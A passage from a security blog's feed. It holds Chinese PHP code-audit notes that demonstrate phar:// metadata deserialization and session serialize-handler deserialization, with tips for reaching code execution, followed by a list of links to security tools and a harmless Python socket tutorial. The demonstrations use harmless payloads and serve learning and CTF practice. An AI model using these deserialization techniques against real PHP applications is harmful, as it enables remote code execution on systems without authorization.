phar协议的构造反序列化</h2><p><code>Phar://</code>配合file_exist()或者file_get_contents()进行反序列化</p><p>生成payload Phar.phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($test)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = $test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span></span>&#123;&#125;</span><br><span class="line">@unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//第一步设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> test(<span class="keyword">new</span> example);</span><br><span class="line">$phar-&gt;setMetadata($o);<span class="comment">//第二步：存放文件权限、属性等，还有用户自定义的meta-data(这个可以数据是以序列化形式存放的，因此可以造成反序列化漏洞)</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"hahh.jpg"</span>,<span class="string">"test"</span>);<span class="comment">//第三部要被压缩的文件内容，第一个是文件名，后面是文件内容，第四步是签名</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>利用结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;aa();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;call();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">example</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __call() method.</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = <span class="string">'phar://phar.phar/hahh.jpg'</span>;</span><br><span class="line">file_get_contents($filename);<span class="comment">//输出ok表示利用成功</span></span><br></pre></td></tr></table></figure><p>利用条件：</p><p>1、文件系统函数参数可控且<code>:</code>、<code>/</code>、<code>phar</code>可以使用</p><p>2、phar文件能上传至服务端</p><p> <img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/03/02/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.jpg" alt="img"> </p><h2 id="0x12-php-session反序列化"><a href="#0x12-php-session反序列化" class="headerlink" title="0x12 php session反序列化"></a>0x12 php session反序列化</h2><p>在调用<code>session_start()</code>之前调用<code>session_save_path(string path)</code>可以修改session存放的路径。</p><p>也可以使用<code>session_start(array(&quot;save_path&quot;=&gt;string path))</code>来修改存储路径。</p><p>这样就可以控制文件包含的路径了，然后通过传值传入<code>sess_id</code>实现rce。</p><p>php中session的存储方式：</p><ul><li>php_binary:  <code>ASCII(6)spoocks:48:&quot;|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;}&quot;;</code>使用的是key，value格式。</li><li>Php_serialize：<code>a:1:{s:6:&quot;spoock&quot;;s:48:&quot;|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;}&quot;;}</code>使用反序列化的方式来存储。</li><li>Php： <code>spoock|s:48:&quot;|O:5:&quot;lemon&quot;:1:{s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;}&quot;;</code>使用key，value的形式，并且通过｜进行分隔，后面的value使用反序列化存储。</li></ul><p>实验过程：</p><p>先实现反序列化payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"hahaha"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize($b);<span class="comment">//O:4:"test":1:&#123;s:1:"a";s:6:"hahaha";&#125;</span></span><br></pre></td></tr></table></figure><p>然后将payload前面加<code>|</code>实现session—payload<code>|O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:6:&quot;hahaha&quot;;}</code></p><p>将session-payload传入session文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">"knight"</span>]=$_GET[<span class="string">'a'</span>];</span><br></pre></td></tr></table></figure><p>此时生成了一个session文件</p><p>内容为<code>a:1:{s:6:&quot;spoock&quot;;s:37:&quot;|O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:6:&quot;hahaha&quot;;}&quot;;}</code></p><p>然后访问文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set("session.serialize_handler","php");</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="comment">//hahaha</span></span><br></pre></td></tr></table></figure><p>即可实现php反序列化</p><p>利用条件：</p><p>1、两次session.serialize_handler处理引擎不同</p><p>2、能传值进入php session文件</p><p>3、有反序列化点</p><p>tips：如果对反序列化的结果进行了字符串长度变化的操作，可以使用;}截断反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$username=<span class="string">"a'a\a;&#125;"</span>;</span><br><span class="line">$passwd=<span class="string">"bbb"</span>;</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">array</span>($username,$passwd);</span><br><span class="line">var_dump(<span class="string">"\\0"</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($user);<span class="comment">//a:2:&#123;i:0;s:1:"a";i:1;s:2:"bb";&#125;";i:1;s:3:"bbb";&#125;</span></span><br></pre></td></tr></table></figure><p>tips：寻找rce时还可以寻找类似的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"system"</span>;</span><br><span class="line">$b = <span class="string">"dir"</span>;</span><br><span class="line">$a($b);<span class="comment">//输出文件目录</span></span><br></pre></td></tr></table></figure><p>tips：当遇见<code>$this-&gt;event-&gt;aaa($event)</code>时<code>$this-&gt;event</code>是个可控的类名，那么就可以去寻找是否有类存在<code>__call</code>方法，然后看看能不能通过此方法执行任意函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __call() method.</span></span><br><span class="line">        <span class="keyword">echo</span> $name.<span class="string">"\n"</span>;</span><br><span class="line">        var_dump($arguments);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">new</span> a();</span><br><span class="line">$b-&gt;d(<span class="string">"id"</span>);<span class="comment">//a     array([0]=&gt;"id")</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;php代码审计学习笔记&quot;&gt;&lt;a href=&quot;#php代码审计学习笔记&quot; class=&quot;headerlink&quot; title=&quot;php代码审计学习笔记&quot;&gt;&lt;/a&gt;php代码审计学习笔记&lt;/h1&gt;&lt;h2 id=&quot;0x00-php匿名函数&quot;&gt;&lt;a href=&quot;#0x00-
      
    
    </summary>
    
    
    
      <category term="php" scheme="https://knightswd.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="https://knightswd.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>网站大合集</title>
    <link href="https://knightswd.github.io/2019/11/06/%E7%BD%91%E7%AB%99%E5%A4%A7%E5%90%88%E9%9B%86/"/>
    <id>https://knightswd.github.io/2019/11/06/%E7%BD%91%E7%AB%99%E5%A4%A7%E5%90%88%E9%9B%86/</id>
    <published>2019-11-06T09:50:55.000Z</published>
    <updated>2019-11-06T10:09:32.326Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><a href="http://tool.chinaz.com/" target="_blank" rel="noopener">站长之家</a>(查ip，域名，whois记录)                         |                <a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a>(世界上最大的联网设备搜索引擎)                                           </p><p><a href="https://fofa.so/" target="_blank" rel="noopener">fofa</a>(和shodan类似)                                                 |             <a href="https://www.zoomeye.org/" target="_blank" rel="noopener">zoomeye</a>(钟馗之眼，知道创宇的产品，和shodan类似)</p><p><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a>(查企业信息)                                                  |            <a href="https://www.virustotal.com" target="_blank" rel="noopener">VirusTotal</a>(域名，子域名详细信息查询)</p><p><a href="http://www.yunsee.cn/" target="_blank" rel="noopener">云悉企业资产查询</a>                                                    |           <a href="https://ip.sb/" target="_blank" rel="noopener">测试ipv6连接</a> </p><p><a href="https://www.hao7188.com/" target="_blank" rel="noopener">查ip的详细地址</a>                                                        |          <a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">cms指纹识别</a></p><p><a href="https://www.freebuf.com/sectool/105524.html" target="_blank" rel="noopener">渗透测试工具集</a>                                                        |           <a href="https://www.reg007.com/" target="_blank" rel="noopener">查邮箱或者手机注册过的网站</a></p><p><a href="https://archive.org/" target="_blank" rel="noopener">世界上最大的网页快照网站archive</a>(可以看见网站多年前的网页)</p><p><a href="http://www.beianbeian.com/" target="_blank" rel="noopener">网站备案信息查询</a>                                                     |           <a href="http://axtx.net/websec/172.html" target="_blank" rel="noopener">常用工具整理</a></p><p><a href="http://www.nsoad.com/Security-tools/20180730/tools-1217.html" target="_blank" rel="noopener">wlgf整理工具</a></p><h2 id="大佬博客"><a href="#大佬博客" class="headerlink" title="大佬博客"></a>大佬博客</h2><p><a href="https://skysec.top/" target="_blank" rel="noopener">一叶飘零-web</a>                                                            |             <a href="https://payloads.online/" target="_blank" rel="noopener">倾旋-web</a>                                                     </p><p><a href="http://v1nke.win" target="_blank" rel="noopener">v1nke-pwn</a>                                                                 |             <a href="https://www.leavesongs.com/" target="_blank" rel="noopener">P神-web</a></p><p><a href="https://pic4xiu.github.io" target="_blank" rel="noopener">pic-pwn</a>                                                                      |            <a href="https://navisec.it" target="_blank" rel="noopener">大佬的安全导航网站</a></p><p><a href="https://www.smi1e.top" target="_blank" rel="noopener">smile-web</a>                                                                  |            <a href="http://nekosec.top" target="_blank" rel="noopener">nek0c-web</a></p><h2 id="技术前沿"><a href="#技术前沿" class="headerlink" title="技术前沿"></a>技术前沿</h2><p><a href="http://cve.mitre.org/" target="_blank" rel="noopener">cve官网</a>                                                                       |           <a href="https://www.blackhat.com/" target="_blank" rel="noopener">blackhat官网</a></p><p><a href="https://www.t00ls.net/" target="_blank" rel="noopener">吐司tools</a>                                                                   |           <a href="https://www.oschina.net/" target="_blank" rel="noopener">开源中国</a></p><p><a href="https://www.52pojie.cn//" target="_blank" rel="noopener">吾爱破解</a>                                                                    |           <a href="https://xz.aliyun.com/" target="_blank" rel="noopener">先知社区</a></p><p><a href="https://paper.seebug.org" target="_blank" rel="noopener">Paper</a>                                                                         |         <a href="http://0day5.com/" target="_blank" rel="noopener">漏洞时代</a></p><p><a href="https://hackaday.com//" target="_blank" rel="noopener">国外硬件黑客</a>                                                             |           <a href="https://packetstormsecurity.com/" target="_blank" rel="noopener">国外黑客骚操作</a></p><p><a href="https://www.v2ex.com/" target="_blank" rel="noopener">V2EX</a>                                                                           |          <a href="https://java.ctolib.com" target="_blank" rel="noopener">java开发社区</a></p><p><a href="http://expku.com/" target="_blank" rel="noopener">exploit库</a></p><h2 id="大数据网站"><a href="#大数据网站" class="headerlink" title="大数据网站"></a>大数据网站</h2><p><a href="http://data.stats.gov.cn/" target="_blank" rel="noopener">国家数据</a>                                                                     |          <a href="https://www.kaggle.com/" target="_blank" rel="noopener">kaggle</a>(机器学习，数据可视化数据来源)</p><p><a href="https://tianchi.aliyun.com/home/" target="_blank" rel="noopener">天池数据集</a>                                                                 |         <a href="http://www.image-net.org/" target="_blank" rel="noopener">imagenet图片集</a></p><h2 id="工具网站"><a href="#工具网站" class="headerlink" title="工具网站"></a>工具网站</h2><p><a href="https://img.top" target="_blank" rel="noopener">在线压缩图片</a>                                                              |       <a href="http://factordb.com/" target="_blank" rel="noopener">rsa因式分解</a></p><p><a href="http://tool.chinaz.com/Tools/subnetmask" target="_blank" rel="noopener">ip转化工具</a>                                                                   |     <a href="http://tool.chinaz.com/regex/" target="_blank" rel="noopener">正则表达式在线测试</a></p><p><a href="https://www.freepdfconvert.com/zh-hans/pdf-to-ppt" target="_blank" rel="noopener">pdf转ppt</a>                                                                      |      <a href="http://webhook.site/#!/c843f89c-8ea9-42e5-9c4a-984b43534b10" target="_blank" rel="noopener">测试ssrf的网站</a></p><p><a href="http://www.hippter.com/" target="_blank" rel="noopener">ppt素材下载</a></p><h2 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h2><p><a href="http://www.wechall.net/sites.php" target="_blank" rel="noopener">国外刷题网站</a>                                                             |       <a href="https://buuoj.cn/login" target="_blank" rel="noopener">北京联合大学刷题网站</a></p><p><a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">P神php小密圈奇技淫巧</a>                                             |         <a href="https://www.ctolib.com/topics-110734.html" target="_blank" rel="noopener">php黑魔法</a></p><p><a href="https://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">命令执行绕过技巧</a>                                                      |         <a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">python中的ssrf</a></p><p><a href="https://wooyun.js.org/drops/jother%E7%BC%96%E7%A0%81%E4%B9%8B%E8%B0%9C.html" target="_blank" rel="noopener">jother编码</a>                                                                   |      <a href="https://www.freebuf.com/column/166385.html" target="_blank" rel="noopener">代码注入技巧</a></p><p><a href="https://www.smi1e.top/php不使用数字字母和下划线写shell/" target="_blank" rel="noopener">php不使用数字或字符构造exp</a>                                 |         <a href="https://www.k0rz3n.com/2018/11/19/一篇文章带你深入理解PHP反序列化漏洞/" target="_blank" rel="noopener">php反序列化</a></p><p><a href="https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html" target="_blank" rel="noopener">sql注入绕waf</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://tool.chinaz.com/&quot; target=&quot;_blank&quot; rel=&quot;noopene
      
    
    </summary>
    
    
    
      <category term="ctf" scheme="https://knightswd.github.io/tags/ctf/"/>
    
      <category term="web" scheme="https://knightswd.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Python Socket Programming</title>
    <link href="https://knightswd.github.io/2019/10/17/Python-Socket-Programming/"/>
    <id>https://knightswd.github.io/2019/10/17/Python-Socket-Programming/</id>
    <published>2019-10-17T04:32:56.000Z</published>
    <updated>2019-10-17T04:42:31.099Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python-Socket-Programming"><a href="#Python-Socket-Programming" class="headerlink" title="Python Socket Programming"></a>Python Socket Programming</h1><h2 id="0x00-For-Server"><a href="#0x00-For-Server" class="headerlink" title="0x00 For Server"></a>0x00 For Server</h2><p>​    Firstly , you should start a TCP/IP socket.So,what’s  the Socket?</p><p>​    A socket is an endpoint of a two-way communication link between two programs running on the network. It’s bound to a port number and TCP or IP protocol. It means every process has only one port and tranport layer protocols .When there  are two different computers, it also need to know the IP adress of the other host .the socket is an interface that one program  communicate with another program. For upper layer, they don’t need to know how it works ,you don’t need to know how  TCP establish connection by three-way handshake and terminate connection by four waves,if they want to send or receive messages ,they only need to import <code>socket</code>. Python provides an api for developers to use a socket.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment">#Create a TCP/IP socket</span></span><br><span class="line">sock = socket .socket(socket.AF_INET, socket.SOCK_STREAM)</span><br></pre></td></tr></table></figure><p>socket format :socket.socket(family, type[,potocal])</p><p><code>socket type:</code></p><p>socket.AF_UNIX: Is used to communicate between processes on the same machine efficiently</p><p>socket.AF_INET: Is used to communicate between processes over a IPV4 network</p><p>socket.AF_INET6: Is used to communicate between processes over a IPV6 network</p><p>socket.SOCK_STREAM: Connection which is based on the TCP </p><p>socket.SOCK_DGRAM: Connection which is based on the UDP </p><p>sock.SOCK_RAM: Receive or send the raw datagram not including link level headers</p><p>sock.SOCK_SEQPACKET: It will guarantee that message emission would correspond to a single and complete message reception.</p><p>After that ,you need to use <code>bind()</code> to associate the socket with the service address (For TCP ,you need an IP adress and port number)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bind the socket to your port</span></span><br><span class="line">server_adress = (<span class="string">'localhost'</span>,<span class="number">9876</span>)</span><br><span class="line">socket.bind(server_adress)   <span class="comment">#use bind() method</span></span><br></pre></td></tr></table></figure><p>​    With us build a socket ,we need to use listen(int backlog) method to monitor passive data.</p><p>​    For the parameter in the listen(),it means the max connection for this operating system at the same time.(at least use 1,most use  5)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sock.listen(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># listen for incoming connections</span></span><br></pre></td></tr></table></figure><p>​    Accept() method  is used to accept the data after you listen a connection.However ,you need to keep accept state,for the data is sent continuously.Therefore, there is supposed to use <code>while True</code> to keep accept().</p><p>​    As for why I use two <code>while True</code>,for the first one ,it’s used to keep TCP connection, after one connection  close ,it will keep accept for other TCP connection.For the second one ,it’s used to keep accepting message,after one message received, it will keep receiving other message until no message is sent.</p><p>​    At last , using close() method to close the socket connection.</p><p>C/S </p><p>Server code:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(address, port)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment">#Create a TCP socket</span></span><br><span class="line">    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)<span class="comment">#reuse the port, avoid to waiting</span></span><br><span class="line">    server_address = (address, port)</span><br><span class="line">    sock.bind(server_address)       <span class="comment">#Bind in server adress</span></span><br><span class="line">    sock.listen(<span class="number">5</span>)                  <span class="comment">#Keep listening</span></span><br><span class="line">    print(<span class="string">"server is running"</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn, addr = sock.accept()  <span class="comment">#Keep accepting,it will return a tuple</span></span><br><span class="line">        print(<span class="string">'connected by '</span>, addr)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = conn.recv(<span class="number">1024</span>)   <span class="comment"># Recive message</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            print(data.decode())</span><br><span class="line">            reply = input(<span class="string">'reply:'</span>)</span><br><span class="line">            conn.send(reply.encode())   <span class="comment">#Send message</span></span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    address = <span class="string">'192.168.3.57'</span>  <span class="comment">#Which IP adress you want to monitor</span></span><br><span class="line">    port = <span class="number">9876</span></span><br><span class="line">    print(<span class="string">'starting.....'</span>)</span><br><span class="line">    connect(address, port)</span><br></pre></td></tr></table></figure><hr><h2 id="0x01-For-Client"><a href="#0x01-For-Client" class="headerlink" title="0x01 For Client"></a>0x01 For Client</h2><p>​    Just like the server, the client also needs to use a socket .But it doesn’t have to be so complicated ,you only need to use connect() method to connect to the server.</p><p>Client:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(adress,port)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  <span class="comment">#Create a TCP socket</span></span><br><span class="line">    server_adress = (adress, port)</span><br><span class="line">    sock.connect(server_adress)      <span class="comment">#Connect to server</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = input(<span class="string">'Please input you message：'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        sock.send(data.encode())</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        print(data.decode())</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    sock.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    adress = <span class="string">'192.168.3.57'</span>    <span class="comment">#Server IP adress</span></span><br><span class="line">    port = <span class="number">9876</span></span><br><span class="line">    connect(adress, port)</span><br></pre></td></tr></table></figure><hr><h2 id="0x02-Summary"><a href="#0x02-Summary" class="headerlink" title="0x02 Summary"></a>0x02 Summary</h2><p>For server:</p><p><code>socket.socket()</code>–&gt;<code>bind()</code>–&gt;<code>listen()</code>–&gt;<code>while True</code>–&gt;<code>accept()</code>–&gt;<code>while True</code>–&gt;<code>recv</code>–&gt;<code>send()</code></p><p>For client:</p><p><code>socket.socket()</code>–&gt;<code>connect()</code>–<code>while True</code>–&gt;<code>send()</code>–&gt;<code>recv()</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Python-Socket-Programming&quot;&gt;&lt;a href=&quot;#Python-Socket-Programming&quot; class=&quot;headerlink&quot; title=&quot;Python Socket Programming&quot;&gt;&lt;/a&gt;Python Sock
      
    
    </summary>
    
    
    
      <category term="Python" scheme="https://knightswd.github.io/tags/Python/"/>
    
      <category term="Socket" scheme="https://knightswd.github.io/tags/Socket/"/>
    
  </entry>
  
  <entry>
    <title>url中的unicode漏洞</title>
    <link href="https://knightswd.github.io/2019/08/26/url%E4%B8%AD%E7%9A%84unicode%E6%BC%8F%E6%B4%9E/"/>
    <id>https://knightswd.github.io/2019/08/26/url%E4%B8%AD%E7%9A%84unicode%E6%BC%8F%E6%B4%9E/</id>
    <published>2019-08-26T13:14:39.000Z</published>
    <updated>2019-08-26T13:35:10.556Z</updated>
    
